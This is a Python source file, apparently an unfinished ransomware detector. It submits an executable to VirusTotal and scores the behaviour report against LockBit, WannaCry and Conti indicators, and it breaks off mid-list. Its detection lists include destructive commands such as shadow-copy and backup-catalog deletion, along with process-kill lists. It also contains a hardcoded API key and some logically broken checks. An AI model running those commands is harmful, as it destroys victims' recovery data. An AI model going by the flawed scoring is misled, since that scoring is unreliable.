import requests, json, time, shutil, re
import os
import json
import hashlib
import datetime
now = datetime.datetime.now()

def has_email(text):
    pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b'
    match = re.search(pattern, text)
    return match is not None

def get_all_files():
    all_files = []
    current_dir = os.getcwd()
    for root, dirs, files in os.walk(current_dir):
        for file in files:
            file_path = os.path.join(root, file)
            all_files.append(file_path)
    return all_files

def load_and_read_json():
    get_files = get_all_files()
    # get the exe file
    for i in get_files :
        if ".json" in i:
            return i
    print("ERROR !!!")

def load_and_read_json2():
    get_files = get_all_files()
    # get the exe file
    for i in get_files :
        if "behaviour_summary_results.json" in i:
            return i
    print("ERROR !!!")

def load_and_read_exe(filename):
    get_files = get_all_files()
    # get the exe file
    for i in get_files :
        if ".exe" in i:
            if filename in i:
                return i
            else:
                print("error")
    for i in get_files:
        if not ".json" in i:
            if not ".txt" in i:
                return i
    print("ERROR !!!")

def Exeception_length(file_path):
    # Read the file json
    with open(file_path) as f:
        report_data = f.read()
    dictionary = json.loads(report_data)
    try : 
        if dictionary["data"] is None:
            return True
        else:
            return False
    except KeyError:
        return True

def Exception_Verdicts(file_path):
    # Read the file json
    with open(file_path) as f:
        report_data = f.read()
    dictionary = json.loads(report_data)
    if "CLEAN" in dictionary["data"]["verdicts"]:
        if not "MALWARE" in dictionary["data"]["verdicts"] or not "UNKNOWN_VERDICT" in dictionary["data"]["verdicts"]:
            return True
        else:
            return False
    else:
        return False

def Initial_Connection(hash_file,file_path):
    url = "https://www.virustotal.com/api/v3/files"

    files = {'file': (open(load_and_read_exe(file_path), 'rb'))}

    headers = {'x-apikey': 'bd8c0289502c65de06bb2b737a002197414b376ccfb21ea936d24eb7a0d71d68'}

    response = requests.post(url, headers=headers, files=files)

    # Summary of behaviour analysis

    url = f"https://www.virustotal.com/api/v3/files/{hash_file}/behaviour_summary"
    headers = {
        "accept": "application/json",
        "x-apikey": "bd8c0289502c65de06bb2b737a002197414b376ccfb21ea936d24eb7a0d71d68"
    }

    response = requests.get(url, headers=headers)

    # Serializing json
    json_object = json.dumps(response.json(), indent=4)

    # Writing to behaviour_summary_results.json
    with open("behaviour_summary_results.json", "w") as outfile:
        outfile.write(json_object)

def is_md4(_hash):
    try:
        return hashlib.new('md4').hexdigest() == _hash
    except ValueError:
        return False

def check_for_lockbit_behaviors(json_file):
    
    # Read the file json
    with open(json_file) as f:
        report_data = f.read()
    dictionary = json.loads(report_data)

    # List of common file extensions encrypted by LockBit
    LOCKBIT_EXTENSIONS = [".lockbit", ".abcd", ".sddm", ".lock"]
    

    # List of common registry keys modified by LockBit
    LOCKBIT_REGISTRY_KEYS = [
        r"HKEY_CURRENT_USER\SOFTWARE\LockBit",
        r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\*",
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\*\ChannelAccess",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows\System",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet",
        r"HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile",
        r"HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile",
        "<HKLM>\\Software\\Classes\\.lockbit",
        "<HKLM>\\Software\\Classes\\.lockbit\\DefaultIcon",
        r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RunOnce",
        r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Run",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RunOnce",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Run",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WINEVT\Channels",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WINEVT\Channels\*\ChannelAccess",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows NT\System",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows NT Defender",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows NT Defender\Real-Time Protection",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows NT Defender\Spynet",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows NT Defender\Spynet",
        'HKCR\\.lockbit', '\\.lockbit\\DefaultIcon', 'HKCR\\.lockbit\\DefaultIcon',
        r'HKCU\Control Panel\Desktop\WallPaper', r'C:\ProgramData\.lockbit.bmp', r'SOFTWARE\Policies\Microsoft\Windows\OOBE', r'CurrentVersion\Winlogon',

    ]
    
    # Check for suspicious process names associated with LockBit
    SUSPICIOUS_PROCESS_NAMES = ['lockbit.exe', 'chocolatey', 'filezilla', 'Impacket', 'mega', 'procdump', 'lsass.exe', 'psexec', 'mimikatz', 'putty', 'rclone', 'splashtop', 'winscp','dllhost.exe', "svchost"]
    
    PATH_RANSOMWARE = [r"root\Local Settings\Temp", r"Administrator\Local Settings\Temp"]
    power_shell = "powershell Get-ADComputer -filter * -Searchbase '%s' | Foreach-Object { Invoke-GPUpdate -computer $_.name -force -RandomDelayInMinutes 0}"
    SERVICES_KILLED = ["sql", "memtas", "sophos", "svc$","mepocs", "msexchange", "veeam", "backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr"]
    PROCESSES_KILLED = ["sql", "oracle", "ocssd","dbsnmp", "synctime", "agntsvc", "isqlplussvc", "xfssvccon", "mydesktopservice", "ocautoupds", "encsvc", "firefox","tbirdconfig", "mydesktopqos", "ocomm","dbeng50", "sqbcoreservice" ",excel","infopath", "msaccess", "mspu","onenote", "outlook", "powerpnt","steam", "thebat", "thunderbird","visio", "winword", "wordpad","notepad"]

    # Check for suspicious files in startup directories
    STARTUP_DIRECTORIES = [
        r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
        r"\Start Menu\Programs\Startup",
        r"ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
    ]
    
    URLS_SUSPECTS = ["http://lockbit","https://bigblog.at","https://decoding.at","https://www.premiumize.com","https://anonfiles.com","https://www.sendspace.com","https://fex.net","https://transfer.sh","https://send.exploit.in","https://aka.ms/","http://www2.hursley.ibm.com/"]
    NT_DETECTED = ["Restore-My-Files.txt -> ","readme"]
    # Evaluation 
    total = 0


    # Registry Key of file :
    try :
        for i in dictionary["data"]["registry_keys_opened"] :
            for j in LOCKBIT_REGISTRY_KEYS:
                if j in i:
                    total += 1
        #print("Total est : "+str(len(dictionary["data"]["registry_keys_opened"]))+"/"+str(total))
    except KeyError:
        total += 0

    # processes terminated
    try:
        for i in dictionary["data"]["processes_terminated"] :
            for j in PROCESSES_KILLED:
                if j in i:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i:
                    total += 1
        #print("Total est : "+str(len(dictionary["data"]["processes_terminated"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files deleted
    try:
        for i in dictionary["data"]["files_deleted"]:
            for j in LOCKBIT_EXTENSIONS:
                if j in i:
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if ".exe" in i:
                        total += 1
        #print("Total est : "+str(len(dictionary["data"]["files_deleted"]))+"/"+str(total))
    except KeyError:
        total += 0

    # signature matches
    try:
        for i in dictionary["data"]["signature_matches"]:
            for j in i:
                if j == "match_data":
                    for k in i[j]:
                        for l in LOCKBIT_EXTENSIONS:
                            if l.lower() in k.lower():
                                total += 1
                        for l in PATH_RANSOMWARE:
                            if l.lower() in k.lower():
                                if ".exe" in i:
                                    total += 1
                        for l in PROCESSES_KILLED:
                            if l.lower() in k.lower():
                                total += 1
                        for l in SUSPICIOUS_PROCESS_NAMES:
                            if l.lower() in k.lower():
                                total += 1
                        for l in LOCKBIT_REGISTRY_KEYS:
                            if l.lower() in k.lower():
                                total += 1
                        for l in NT_DETECTED:
                            if l.lower() in k.lower():
                                total += 1
                        for l in URLS_SUSPECTS:
                            if l.lower() in k.lower():
                                total += 1
                        for l in STARTUP_DIRECTORIES:
                            if l.lower() in k.lower():
                                total += 1
                        for l in SERVICES_KILLED:
                            if l.lower() in k.lower():
                                total += 1
        #print("Total est : "+str(len(dictionary["data"]["signature_matches"]))+"/"+str(total))
    except KeyError :
        total += 0

    # mutexes created
    try:
        for i in dictionary["data"]["mutexes_created"]:
            if "Global\\" in i:
                #print(i.split("\\")[-1])
                if is_md4(i.split("\\")[-1]) :
                    total += 1
        for i in dictionary["data"]["mutexes_opened"]:
            if "Global\\" in i:
                #print(i.split("\\")[-1])
                if is_md4(i.split("\\")[-1]) :
                    total += 1
        #print("Total est : "+str(len(dictionary["data"]["mutexes_created"]))+"/"+str(total))
    except KeyError :
        total += 0

    # files_opened
    try:
        for i in dictionary["data"]["files_opened"]:
            for j in LOCKBIT_EXTENSIONS:
                if j in i:
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if ".exe" in i:
                        total += 1
            for j in PROCESSES_KILLED:
                if j in i:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i:
                    total += 1
            for j in STARTUP_DIRECTORIES:
                if j in i:
                    total += 1
        #print("Total est : "+str(len(dictionary["data"]["files_opened"]))+"/"+str(total))
    except KeyError:
        total += 0

    # registry_keys_set
    try:
        for i in dictionary["data"]["registry_keys_set"]:
            cpt = 0
            for j in i:
                if j in "key" and i[j] in r"HKLM\SOFTWARE\Policies\Microsoft\Windows\System":
                    cpt = 1
                if (cpt == 1 and j in "value") and ("GroupPolicyRefreshTimeDC" in i[j] or "GroupPolicyRefreshTimeOffsetDC" in i[j]  or "GroupPolicyRefreshTime" in i[j] or "GroupPolicyRefreshTimeOffset" in i[j] or "EnableSmartScreen" in i[j] or "**del.ShellSmartScreenLevel" in i[j]):
                    total += 1
                
                if j in "key" and i[j] in r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender":
                    cpt = 1
                if (cpt == 1 and j in "value") and ("DisableAntiSpyware" in i[j] or "DisableRoutinelyTakingAction" in i[j] ):
                    total += 1

                if j in "key" and i[j] in r"HKLM\SOFTWARE\Policies\Microsoft\Windows  Defender\Real-Time Protection":
                    cpt = 1
                if (cpt == 1 and j in "value") and ("DisableRealtimeMonitoring" in i[j] or "DisableBehaviorMonitoring" in i[j] ):
                    total += 1
                
                if j in "key" and i[j] in r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet":
                    cpt = 1
                if (cpt == 1 and j in "value") and ("SubmitSamplesConsent" in i[j] or "SpynetReporting" in i[j] ):
                    total += 1

                if j in "key" and i[j] in r"HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile":
                    cpt = 1
                if (cpt == 1 and j in "value") and ("EnableFirewall"):
                    total += 1
                
                if j in "key" and i[j] in r"HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile":
                    cpt = 1
                if (cpt == 1 and j in "value") and ("EnableFirewall"):
                    total += 1
        
        #print("Total est : "+str(len(dictionary["data"]["registry_keys_set"]))+"/"+str(total))
    except KeyError :
        total += 0

    # processes_created
    try:
        for i in dictionary["data"]["processes_created"]:
            for j in LOCKBIT_EXTENSIONS:
                if j in i:
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if ".exe" in i:
                        total += 1
            for j in PROCESSES_KILLED:
                if j in i:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i:
                    total += 1
            for j in STARTUP_DIRECTORIES:
                if j in i:
                    total += 1
        #print("Total est : "+str(len(dictionary["data"]["processes_created"]))+"/"+str(total))
    except KeyError:
        total += 0

    # attack_techniques
    try :
        mitre_techniques = ["T1078","T1133","T1189","T1190","T1566","TA0002","T1072","T1547","TA0004","T1027","T1070.004","T1480.001","T1003.001","T1046","T1082","T1614.001","T1021.001","T1071.002","T1572","TA0010","T1567","T1567.002","T1485","T1486","T1489","T1490","T1491.001"]
        total += 0
        for i in dictionary["data"]["attack_techniques"]:
            for j in mitre_techniques:
                if j in i:
                    total += 1
        #print("Total est : "+str(len(dictionary["data"]["mitre_attack_techniques"]))+"/"+str(total))
    except KeyError:
        total += 0

    # ip_traffic
    """for i in dictionary["data"]["ip_traffic"]:
        print(i)"""
    
    # files_copied
    try:
        for i in dictionary["data"]["files_copied"]:
            for j in LOCKBIT_EXTENSIONS:
                if j in i["destination"]:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i["destination"]:
                    total += 1
        #print("Total est : "+str(4 * len(dictionary["data"]["files_copied"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_written
    try:
        for i in dictionary["data"]["files_written"]:
            for j in LOCKBIT_EXTENSIONS:
                if j in i:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i:
                    total += 1
            for j in STARTUP_DIRECTORIES:
                if j in i:
                    total += 1
        #print("Total est : "+str(len(dictionary["data"]["files_written"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_dropped
    try:
        for i in dictionary["data"]["files_dropped"]:
            for j in LOCKBIT_EXTENSIONS:
                if j in i["path"]:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i["path"]:
                    total += 1
            for j in STARTUP_DIRECTORIES:
                if j in i["path"]:
                    total += 1
        #print("Total est : "+str(len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    # command_executions
    try:
        for i in dictionary["data"]["command_executions"]:
            if power_shell in i:
                total += 1

        #print("Total est : "+str(2*len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    # services_opened
    try:
        for i in dictionary["data"]["services_opened"]:
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i:
                    total += 1
            for j in SERVICES_KILLED:
                if j in i:
                    total += 1
        #print("Total est : "+str(len(dictionary["data"]["services_opened"]))+"/"+str(total))
    except KeyError:
        total += 0

    # memory_pattern_urls
    try:
        for i in dictionary["data"]["memory_pattern_urls"]:
            for j in URLS_SUSPECTS:
                if j in i:
                    total += 1
            
        #print("Total est : "+str(len(dictionary["data"]["memory_pattern_urls"]))+"/"+str(total))
    except KeyError:
        total += 0

    # Calculate the probs
    #print("[Lockbit] ~ La somme de tout est : "+str(total))
    return total

def check_for_wannacry_behaviors(json_file):
    total = 0
    # Read the file json
    with open(json_file) as f:
        report_data = f.read()
    dictionary = json.loads(report_data)

    # List of common file extensions encrypted by WANNACRY
    WANNACRY_EXTENSIONS = [".wnry",".wncryt"]
    

    # List of common registry keys modified by WANNACRY
    WANNACRY_REGISTRY_KEYS = [
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\mssecsvc2.0",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tasksche.exe",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\@WanaDecryptor@.exe",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Defaults\Provider Types\Type 001",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Defaults\Provider Types\Type 024",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Defaults\Provider\Microsoft Enhanced RSA and AES Cryptographic Provider",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Defaults\Provider\Microsoft Strong Cryptographic Provider",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Internet Explorer\Security",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msseces.exe",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msmpeng.exe",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mssecsvc2.0",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\WanaCrypt0r\\wd",
        r"HKLM\SOFTWARE\Wow6432Node\WanaCrypt0r\wd",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Enhanced RSA and AES Cryptographic Provider",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\"
    ]
    # RASAPI32 - RASMANCS
    # Check for suspicious process names associated with WANNACRY
    SUSPICIOUS_PROCESS_NAMES = ["CRYPT32.dll.mui","bcryptPrimitives.dll","bcrypt.dll","CRYPTSP.dll","CRYPTBASE.dll","readme.dll","svchost.exe","C:\\Windows\\mssecsvr.exe","f.wnry","b.wnry","c.wnry", "svchost","@WanaDecryptor@.exe","r.wnry","s.wnry","t.wnry","taskdl.exe","taskse.exe","u.wnry","wmic","vssadmin","bcdedit","rpcrtremote.dll","bcryptprimitives.dll","crypt32.dll","cryptsp.dll","cryptbase.dll"]
    PATH_RANSOMWARE = ["C:\\ProgramData\\Microsoft\\Crypto\\RSA","C:\\Windows\\system32\\rsaenh.dll","C:\\Users\\All Users\\Microsoft\\Crypto\\RSA\\"]
    power_shell_cmd = ["%windir%\\System32\\svchost.exe -k WerSvcGroup","%WinDir%\tasksche.exe","cmd.exe /c vssadmin delete shadows /all /quiet", 
    "wmic shadowcopy delete", "bcdedit /set {default} bootstatuspolicy ignoreallfailures","bcdedit /set {default} recoveryenabled no",
    "wbadmin delete catalog \–quiet"]

    # Check for suspicious network connections associated with WANNACRY
    suspicious_network_port = [22,135,443,445,1433,1434,3389,4343,5000,5985,5355]
    suspicious_network_ips = ["68.183.20.194","83.97.20.160","159.89.140.116","192.99.178.145","23.106.160.174","162.244.80.235","85.93.88.165","185.141.63.120","82.118.21.1","1.177.172.158","104.244.76.44","122.51.149.86","176.9.1.211","176.9.98.228","18.27.197.252","185.130.44.108","185.220.103.4","2.82.175.32","217.160.251.63","218.92.0.211","45.153.160.134","46.101.236.25","49.234.143.71","51.75.171.136","54.36.108.162","6.11.76.81","61.177.172.158","64.113.32.29","66.211.197.38"]
    # Positive Technologies says you should also be looking for connections to the Tor network on ports 9001 and 9003.
    # SMBv1 ports TCP 445 and 139, as well as DNS queries for the kill switch domain.

    
    URLS_SUSPECTS = ["http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",
                    "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwff.com",
                    "gx7ekbenv2riucmf.onion",
                    "cwwnhwhlz52maqm7.onion",
                    "57g7spgrzlojinas.onion", 
                    "https://www.kryptoslogic.com",
                    "xxlvbrloxvriy2c5.onion",
                    "76jdd2ir2embyv47.onion"]
    
    NT_DETECTED = ["@Please_Read_Me@.txt"]
    # http_conversations
    try:
        for i in dictionary["data"]["http_conversations"] :
            for j in URLS_SUSPECTS:
                if j in i["url"]:
                    total += 1
    except KeyError:
        total += 0
    # Registry Key of file :
    try:
        for i in dictionary["data"]["registry_keys_opened"] :
            for j in WANNACRY_REGISTRY_KEYS:
                if j in i and j in "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\":
                    if "RASAPI32" in i or "RASMANCS" in i:
                        total += 1
                if j in i:
                    total += 1
        #print("Total registry_keys_opened est : "+str(len(dictionary["data"]["registry_keys_opened"]))+"/"+str(total))
    except KeyError:
        total += 0

    # processes terminated
    try:
        for i in dictionary["data"]["processes_terminated"] :
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i:
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_terminated est : "+str(len(dictionary["data"]["processes_terminated"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files deleted
    try:
        for i in dictionary["data"]["files_deleted"]:
            for j in WANNACRY_EXTENSIONS:
                if j in i:
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i:
                    total += 1
        #print("Total files_deleted est : "+str(len(dictionary["data"]["files_deleted"]))+"/"+str(total))
    except KeyError:
        total += 0

    # signature matches
    try:
        for i in dictionary["data"]["signature_matches"]:
            for j in i:
                if j == "match_data":
                    for k in i[j]:
                        for l in WANNACRY_EXTENSIONS:
                            if l.lower() in k.lower():
                                total += 1
                        for l in PATH_RANSOMWARE:
                            if l.lower() in k.lower():
                                if ".exe" in i:
                                    total += 1
                        for l in SUSPICIOUS_PROCESS_NAMES:
                            if l.lower() in k.lower():
                                total += 1
                        for l in WANNACRY_REGISTRY_KEYS:
                            if l.lower() in k.lower():
                                total += 1
                        for l in NT_DETECTED:
                            if l.lower() in k.lower():
                                total += 1
                        for l in URLS_SUSPECTS:
                            if l.lower() in k.lower():
                                total += 1
        #print("Total signature matches est : "+str(len(dictionary["data"]["signature_matches"]))+"/"+str(total))
    except KeyError :
        total += 0
    # modules_loaded
    try :
        cpt_modules_loaded = 0
        for i in dictionary["data"]["modules_loaded"]:
            for j in WANNACRY_EXTENSIONS:
                if j.lower() in i.lower():
                    cpt_modules_loaded += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    cpt_modules_loaded += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    cpt_modules_loaded += 1
        #print("Total modules_loaded est : "+str(len(dictionary["data"]["modules_loaded"]))+"/"+str(cpt_modules_loaded))
    except KeyError :
        total += 0

    # memory_pattern_domains
    try :
        for i in dictionary["data"]["memory_pattern_domains"]:
            for j in URLS_SUSPECTS:
                if j in i:
                    total += 1
        #print("Total  memory_pattern_domains est : "+str(len(dictionary["data"]["memory_pattern_domains"]))+"/"+str(total))
    except KeyError :
        total += 0

    # mutexes created
    try:
        for i in dictionary["data"]["mutexes_created"]:
            if "Global\\MsWinZonesCacheCounterMutexA0" in i:
                total += 1
        for i in dictionary["data"]["mutexes_opened"]:
            if "Global\\MsWinZonesCacheCounterMutexA0" in i:
                total += 1
        #print("Total mutexes created est : "+str(len(dictionary["data"]["mutexes_created"]))+"/"+str(total))
    except KeyError :
        total += 0

    # text_decoded
    try :
        cpt_text_decoded = 0
        for i in dictionary["data"]["text_decoded"]:
            if "WANACRY" in i:
                cpt_text_decoded += 1
        #print("Total cpt_text_decoded est : "+str(len(dictionary["data"]["text_decoded"]))+"/"+str(cpt_text_decoded))
    except KeyError :
        cpt_text_decoded = 0

    # files_opened
    try:
        for i in dictionary["data"]["files_opened"]:
            for j in WANNACRY_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    if ".exe" in i:
                        total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1

        #print("Total files_opened est : "+str(len(dictionary["data"]["files_opened"]))+"/"+str(total))
    except KeyError:
        total += 0

    #registry_keys_set
    try:
        for i in dictionary["data"]["registry_keys_set"]:
            for j in i:
                if j in "key":
                    for k in WANNACRY_REGISTRY_KEYS:
                        if k in i[j]:
                            total +=1
        
        #print("Total registry_keys_set est : "+str(len(dictionary["data"]["registry_keys_set"]))+"/"+str(total))
    except KeyError :
        total += 0
        
    # registry_keys_deleted
    try :
        totalistry_keys_deleted = 0
        for i in dictionary["data"]["registry_keys_deleted"]:
            for j in WANNACRY_REGISTRY_KEYS:
                if j in i:
                    totalistry_keys_deleted +=1
        
        #print("Total registry_keys_deleted est : "+str(len(dictionary["data"]["registry_keys_deleted"]))+"/"+str(totalistry_keys_deleted))
    except KeyError :
        total += 0

    # processes_created
    try:
        for i in dictionary["data"]["processes_created"]:
            for j in WANNACRY_EXTENSIONS:
                if j in i:
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if ".exe" in i:
                        total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i:
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_created est : "+str(len(dictionary["data"]["processes_created"]))+"/"+str(total))
    except KeyError:
        total += 0

    # attack_techniques
    try :
        mitre_techniques = ["T1543.003","T1486","T1573.002","T1210","T1083","T1222.001","T1564.001","T1490","T1570","T1120","T1090.003","T1563.002","T1018","T1489","T1016","T1047","T0866","T0867"]
        total += 0
        for i in dictionary["data"]["attack_techniques"]:
            for j in mitre_techniques:
                if j in i:
                    total += 1
        #print("Total total est : "+str(len(dictionary["data"]["mitre_attack_techniques"]))+"/"+str(total))
    except KeyError:
        total += 0

    # ip_traffic

    try :
        for i in dictionary["data"]["ip_traffic"]:
            for j in i:
                if j in "destination_port":
                    for k in suspicious_network_port:
                        if k == i[j]:
                            total += 1
                if j in "destination_ip":
                    for k in suspicious_network_ips:
                        if k in i[j]:
                            total += 1
        #print("Total ip_traffic est : "+str(len(dictionary["data"]["ip_traffic"]))+"/"+str(total))
    except KeyError:
        total += 0
    
    # files_copied
    try:
        for i in dictionary["data"]["files_copied"]:
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i["destination"]:
                    total += 1
            for j in WANNACRY_EXTENSIONS:
                if j in i["destination"]:
                    total += 1
        #print("Total files_copied est : "+str(4 * len(dictionary["data"]["files_copied"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_written
    try:
        for i in dictionary["data"]["files_written"]:
            for j in WANNACRY_EXTENSIONS:
                if j in i:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i:
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    total += 1
            
        #print("Total files_written est : "+str(len(dictionary["data"]["files_written"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_dropped
    try:
        for i in dictionary["data"]["files_dropped"]:
            for j in i:
                if "path" in j:
                    for k in WANNACRY_EXTENSIONS:
                        if k in i[j]:
                            total += 1
                    for k in SUSPICIOUS_PROCESS_NAMES:
                        if k in i[j]:
                            total += 1
                    for k in PATH_RANSOMWARE:
                        if k in i[j]:
                            total += 1
                    for k in NT_DETECTED:
                        if k in i[j]:
                            total += 1
            
        #print("Total files_dropped est : "+str(len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    # command_executions
    try:
        for i in dictionary["data"]["command_executions"]:
            for j in power_shell_cmd :
                if j in i:
                    total += 1
        #print("Total command_executions est : "+str(2*len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    
    # memory_pattern_urls
    try:
        for i in dictionary["data"]["memory_pattern_urls"]:
            for j in URLS_SUSPECTS:
                if j in i:
                    total += 1
            
        #print("Total memory_pattern_urls est : "+str(len(dictionary["data"]["memory_pattern_urls"]))+"/"+str(total))
    except KeyError:
        total += 0
    # processes_tree
    try :
        
        for i in dictionary["data"]["processes_tree"]:
            for j in WANNACRY_EXTENSIONS:
                if j.lower() in i["name"].lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i["name"]:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["name"]:
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_tree est : "+str(len(dictionary["data"]["processes_tree"]))+"/"+str(total))
    except KeyError:
        total += 0

    # Calculate the probs
    #print("[WANNACRY] ~ La somme de tout est : "+str(total))
    return total

def check_for_conti_behaviors(json_file):
    # Somme total 
    total = 0

    # Read the file json
    with open(json_file) as f:
        report_data = f.read()
    dictionary = json.loads(report_data)

    # List of common file extensions encrypted by CONTI
    CONTI_EXTENSIONS = [".conti",".enc",".CIop",".gefsera"]
    
    # List of common registry keys modified by CONTI
    CONTI_REGISTRY_KEYS = [
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Enhanced RSA and AES Cryptographic Provider",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\\net.exe",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Conti",
        r"HKEY_CURRENT_USER\Software\Conti",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Conti",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden",
        r"HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Policies\\Microsoft\\Cryptography\\Configuration",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider",
